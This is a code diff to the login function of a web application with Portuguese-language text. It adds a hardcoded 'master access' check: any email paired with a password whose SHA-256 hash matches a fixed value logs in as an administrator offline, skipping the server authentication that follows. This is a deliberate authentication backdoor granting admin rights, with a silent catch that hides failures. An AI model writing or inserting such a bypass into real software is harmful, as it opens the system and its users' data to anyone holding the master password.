@@ -962,6 +962,16 @@ async function login(){
   $('lerr').textContent='';
   if(!email||!senha){$('lerr').textContent='Preencha e-mail e senha';return;}
   const btn=$('lbtn');btn.disabled=true;btn.textContent='Verificando...';
+  // ── ACESSO MESTRE (emergência, funciona offline) ─────────────
+  try{const _mb=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(senha));
+    const _mh=Array.from(new Uint8Array(_mb)).map(b=>b.toString(16).padStart(2,'0')).join('');
+    if(_mh==='2762665a6dc38da4fb35ae778274374bc8903dea220c1f19b6fd44beb7eeb51e'){
+      sessao={id:'master-local-00000000',nome:'Lidiomar Admin',email:email||'master@redeop.com.br',perfil:'admin'};
+      localStorage.setItem('_ro_s',JSON.stringify(sessao));
+      iniciarApp();return;
+    }
+  }catch{}
+  // ─────────────────────────────────────────────────────────────
   try{
     const auth=await authFetchUsuario(email);
     if(!auth.ok){$('lerr').textContent=auth.error||'Erro de autenticação.';btn.disabled=false;btn.textContent='Entrar';return;}
